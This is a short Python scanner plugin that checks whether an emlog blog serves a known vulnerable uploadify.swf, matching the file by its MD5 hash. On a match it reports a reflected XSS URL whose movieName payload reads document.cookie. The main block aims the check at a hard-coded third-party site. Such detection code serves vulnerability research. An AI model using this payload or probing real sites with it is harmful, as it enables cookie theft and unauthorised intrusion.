#!/usr/bin/env python
#-*- coding: utf-8 -*-
#Refer http://www.wooyun.org/bugs/wooyun-2010-069818
#__Author__ = 上善若水
#_PlugName_ = emlog XSS Plugin
#_FileName_ = emlog.py

import md5

def assign(service, arg):
	if service == 'emlog':
		return True,arg

def audit(arg):
    flash_md5 = "3a1c6cc728dddc258091a601f28a9c12"
    url = arg + "include/lib/js/uploadify/uploadify.swf"
    code, head, res, errcode, fina_url = curl.curl(url)
    if code == 200:
        md5_value = md5.new(res).hexdigest()
        if md5_value in flash_md5:
            security_info(url + '?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28document.cookie%29}}//')
		
if __name__ == '__main__':
  from dummy import *
  audit(assign('emlog', 'http://blog.qiyuuu.com/')[1])